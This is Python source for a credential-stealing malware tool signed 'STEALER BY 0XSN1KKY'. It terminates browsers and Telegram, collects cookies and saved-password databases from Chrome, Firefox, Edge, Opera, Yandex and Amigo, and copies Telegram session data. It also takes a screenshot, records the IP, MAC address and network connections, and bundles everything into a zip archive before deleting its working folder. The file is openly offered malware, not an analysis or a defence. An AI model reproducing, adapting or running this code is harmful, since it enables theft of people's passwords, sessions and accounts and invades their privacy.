import browser_cookie3
import psutil
import shutil
import os
import json
import socket
import platform
import win32api
import uuid
import subprocess
from PIL import ImageGrab
import datetime
import zipfile

FILE_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData"
FILE_COOKIE = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\cookie"
FILE_PASSWORDS = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\passwords"
FILE_TG = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\tdata"
SCREENSHOT_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\screenshot.jpg"
ZIP_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming"

hasProgram = {
    "chrome": True,
    "firefox": True,
    "yandex": True,
    "opera": True,
    "amigo": True,
    "edge": True,
    "telegram": True,
}


def create_folder():
    if not os.path.exists(FILE_PATH):
        os.makedirs(FILE_PATH)
    if not os.path.exists(FILE_COOKIE):
        os.makedirs(FILE_COOKIE)
    if not os.path.exists(FILE_TG):
        os.makedirs(FILE_TG)
    if not os.path.exists(FILE_PASSWORDS):
        os.makedirs(FILE_PASSWORDS)
    os.makedirs(FILE_TG, exist_ok=True)


def save_cookies(cookies, browser_name):
    if os.path.exists(FILE_PATH):
        if os.path.exists(FILE_COOKIE):
            filename = f"{FILE_COOKIE}/{browser_name}_cookies.json"
            with open(filename, "w") as file:
                formatted_cookies = [
                    {"name": cookie.name, "value": cookie.value, "domain": cookie.domain, "path": cookie.path,
                     "secure": cookie.secure, "expires": cookie.expires} for cookie in cookies]
                json.dump(formatted_cookies, file, indent=4)
        else:
            create_folder()
            save_cookies(cookies, browser_name)
    else:
        create_folder()
        save_cookies(cookies, browser_name)


def close_browser(browser_name):
    if browser_name == "chrome":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'chrome.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass
    elif browser_name == "firefox":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'firefox.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass
    elif browser_name == "opera":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'opera.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass
    elif browser_name == "yandex":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'browser.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass
    elif browser_name == "amigo":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'browser.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass
    elif browser_name == "edge":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'msedge.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass
    elif browser_name == "tg":
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'Telegram.exe':
                try:
                    psutil.Process(process.info['pid']).terminate()
                except psutil.NoSuchProcess:
                    pass


def yandex_cookie():
    try:
        close_browser("yandex")
        cookies = browser_cookie3.yandex()
        save_cookies(cookies, "yandex")
    except:
        save_cookies([], "yandex_error")
        hasProgram['yandex'] = False


def chrome_cookie():
    try:
        close_browser("chrome")
        cookies = browser_cookie3.chrome()
        save_cookies(cookies, "chrome")
    except:
        save_cookies([], "chrome_error")
        hasProgram['chrome'] = False


def firefox_cookie():
    try:
        close_browser("firefox")
        cookies = browser_cookie3.firefox()
        save_cookies(cookies, "firefox")
    except:
        save_cookies([], "firefox_error")
        hasProgram['firefox'] = False


def opera_cookie():
    try:
        close_browser("opera")
        cookies = browser_cookie3.opera()
        save_cookies(cookies, "opera")
    except:
        save_cookies([], "opera_error")
        hasProgram['opera'] = False


def amigo_cookie():
    try:
        close_browser("amigo")
        cookies = browser_cookie3.amigo()
        save_cookies(cookies, "amigo")
    except:
        save_cookies([], "amigo_error")
        hasProgram['amigo'] = False


def edge_cookie():
    try:
        close_browser("edge")
        cookies = browser_cookie3.edge()
        save_cookies(cookies, "edge")
    except:
        save_cookies([], "edge_error")
        hasProgram['edge'] = False


def getip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address


def gethostname():
    hostname = socket.gethostname()
    return hostname


def get_mac_address():
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e + 2] for e in range(0, 12, 2)])


def get_network_connections():
    try:
        result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, shell=True)
        if result.returncode == 0:
            return result.stdout.encode('utf-8', errors='ignore').decode('utf-8')
        else:
            return f"Error executing netstat: {result.stderr}"
    except Exception as e:
        return f"An error occurred: {e}"


# получение информации пользователя
def pcinfo():
    cpu_info = {
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
        "CPU Frequency": psutil.cpu_freq().current,
        "CPU Usage": psutil.cpu_percent(interval=1)
    }

    # Информация об оперативной памяти
    memory_info = {
        "Total Memory": psutil.virtual_memory().total,
        "Available Memory": psutil.virtual_memory().available,
        "Used Memory": psutil.virtual_memory().used,
        "Memory Usage": psutil.virtual_memory().percent
    }
    try:
        # Информация о дисках
        disk_info = []
        for partition in psutil.disk_partitions():
            disk_info.append({
                "Device": partition.device,
                "Mount Point": partition.mountpoint,
                "File System": partition.fstype,
                "Total Space": psutil.disk_usage(partition.mountpoint).total,
                "Used Space": psutil.disk_usage(partition.mountpoint).used,
                "Free Space": psutil.disk_usage(partition.mountpoint).free,
                "Disk Usage": psutil.disk_usage(partition.mountpoint).percent
            })
    except:
        disk_info = ["Disk(s) were not detected or an error occurred"]

    # Операционная система
    os_info = {
        "System": platform.system(),
        "Release": platform.release(),
        "Version": platform.version()
    }
    try:
        graphics_cards = []
        devices = win32api.EnumDisplayDevices(None, 0)
        for device in devices:
            if device.DeviceName not in [dev.DeviceName for dev in graphics_cards]:
                graphics_cards.append(device)

        gpu_info = []
        for index, card in enumerate(graphics_cards):
            gpu_info.append({
                "GPU": f"GPU {index + 1}:",
                "Device Name": card.DeviceName,
                "Description": card.DeviceString,
                "Driver Version": card.DeviceKey[-8:]
            })
    except:
        gpu_info = ["Graphics processor(s) were not detected or an error occurred"]

    if not os.path.exists(FILE_PATH):
        create_folder()

    with open(f"{FILE_PATH}/PC INFO.txt", "w") as file:
        current_datetime = datetime.datetime.now()
        formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
        file.write(f"""Информация о компьютере на котором был запущен стиллер
----------------------------------------------
Время запуска стиллера: {formatted_datetime}
Имя компьютера/пользователя: {os.getlogin()}

Айпи адрес: {getip()}
MAC-Адрес: {get_mac_address()}
Хост нейм: {gethostname()}
Информация о сетевых подключениях: {get_network_connections()}

Найденно програм:
{hasProgram}
(True - найденно, False - не найденно)

CPU INFO:
{cpu_info}

GPU INFO:
{gpu_info}

MEMORY INFO:
{memory_info}

DISK INFO:
{disk_info}

OS INFO:
{os_info}


STEALER BY 0XSN1KKY :)

----------------------------------------------


Information about the computer on which the stealer was launched
----------------------------------------------
Steeler start time: {formatted_datetime}
Computer/username: {os.getlogin()}

IP address: {getip()}
MAC Address: {get_mac_address()}
Hostname: {gethostname()}
Network connection information: {get_network_connections()}

Programs found:
{hasProgram}
(True - found, False - not found)

CPU INFO:
{cpu_info}

GPU INFO:
{gpu_info}

MEMORY INFO:
{memory_info}

DISK INFO:
{disk_info}

OS INFO:
{os_info}


STEALER BY 0XSN1KKY :)

----------------------------------------------""")
        file.close()


def take_screenshot(format="JPEG"):
    screenshot = ImageGrab.grab()
    screenshot.save(SCREENSHOT_PATH, format)


def telegram_steal():
    source_folder = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Telegram Desktop", "tdata")
    destination_folder = FILE_TG

    if not os.path.exists(destination_folder):
        create_folder()

    try:
        close_browser("tg")
        for root, dirs, files in os.walk(source_folder):
            for file in files:
                source_file = os.path.join(root, file)
                relative_path = os.path.relpath(source_file, source_folder)
                destination_file = os.path.join(destination_folder, relative_path)

                destination_dir = os.path.dirname(destination_file)
                os.makedirs(destination_dir, exist_ok=True)

                shutil.copy(source_file, destination_file)
    except:
        hasProgram['telegram'] = False



def chrome_passwords():
    if not os.path.exists(FILE_PASSWORDS):
        create_folder()
    try:
        source_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
                                   "Default", "Login Data")

        if not os.path.exists(FILE_PASSWORDS + "/Chrome"):
            os.makedirs(FILE_PASSWORDS + "/Chrome")

        close_browser("chrome")
        shutil.copy(source_path, f"{FILE_PASSWORDS}/Chrome")
    except:
        hasProgram['chrome'] = False


def firefox_passwords():
    if not os.path.exists(FILE_PASSWORDS):
        create_folder()
    try:
        profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        profile_folder = os.listdir(profile_path)[1]

        source_path = os.path.join(profile_path, profile_folder, "logins.json")
        destination_folder = os.path.join(FILE_PASSWORDS, "Firefox")

        if not os.path.exists(destination_folder):
            os.makedirs(destination_folder)

        close_browser("firefox")

        shutil.copy(source_path, destination_folder)
    except:
        try:
            profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
            profile_folder = os.listdir(profile_path)[0]

            source_path = os.path.join(profile_path, profile_folder, "logins.json")
            destination_folder = os.path.join(FILE_PASSWORDS, "Firefox")

            if not os.path.exists(destination_folder):
                os.makedirs(destination_folder)

            close_browser("firefox")

            shutil.copy(source_path, destination_folder)
        except:
            hasProgram['firefox'] = False


def yandex_passwords():
    if not os.path.exists(FILE_PASSWORDS):
        create_folder()
    try:
        source_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Yandex", "YandexBrowser",
                                   "User Data", "Default", "Ya Login Data")

        if not os.path.exists(FILE_PASSWORDS + "/Yandex"):
            os.makedirs(FILE_PASSWORDS + "/Yandex")

        close_browser("yandex")
        shutil.copy(source_path, f"{FILE_PASSWORDS}/Yandex")
    except:
        hasProgram['yandex'] = False


def opera_passwords():
    if not os.path.exists(FILE_PASSWORDS):
        create_folder()

    try:
        source_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable",
                                   "Login Data")

        if not os.path.exists(FILE_PASSWORDS + "/Opera"):
            os.makedirs(FILE_PASSWORDS + "/Opera")

        close_browser("opera")
        shutil.copy(source_path, f"{FILE_PASSWORDS}/Opera")
    except:
        hasProgram['opera'] = False


def amigo_passwords():
    if not os.path.exists(FILE_PASSWORDS):
        create_folder()

    try:
        source_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Amigo", "User Data", "Default",
                                   "Login Data")

        if not os.path.exists(FILE_PASSWORDS + "/Amigo"):
            os.makedirs(FILE_PASSWORDS + "/Amigo")

        close_browser("amigo")
        shutil.copy(source_path, f"{FILE_PASSWORDS}/Amigo")
    except:
        hasProgram['amigo'] = False


def edge_passwords():
    if not os.path.exists(FILE_PASSWORDS):
        create_folder()

    try:
        source_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",
                                   "Default", "Web Data")

        if not os.path.exists(FILE_PASSWORDS + "/Edge"):
            os.makedirs(FILE_PASSWORDS + "/Edge")

        close_browser("edge")
        shutil.copy(source_path, f"{FILE_PASSWORDS}/Edge")
    except:
        hasProgram['edge'] = False


def create_zip_archive():
    global ZIP_PATH
    ZIP_PATH = os.path.join(ZIP_PATH, f"{os.getlogin()} logs.zip")

    with zipfile.ZipFile(ZIP_PATH, 'w', compression=zipfile.ZIP_BZIP2, allowZip64=True) as zipf:
        for root, _, files in os.walk(FILE_PATH):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, FILE_PATH)
                zipf.write(file_path, arcname)

    return True

def delFolder():
    shutil.rmtree(FILE_PATH)
    os.remove(ZIP_PATH)



def steal_all():
    # telegram
    telegram_steal()
    # browser cookie
    chrome_cookie()
    firefox_cookie()
    opera_cookie()
    yandex_cookie()
    amigo_cookie()
    edge_cookie()

    # browser passwords
    chrome_passwords()
    firefox_passwords()
    opera_passwords()
    yandex_passwords()
    amigo_passwords()
    edge_passwords()

    # other
    take_screenshot()
    pcinfo()
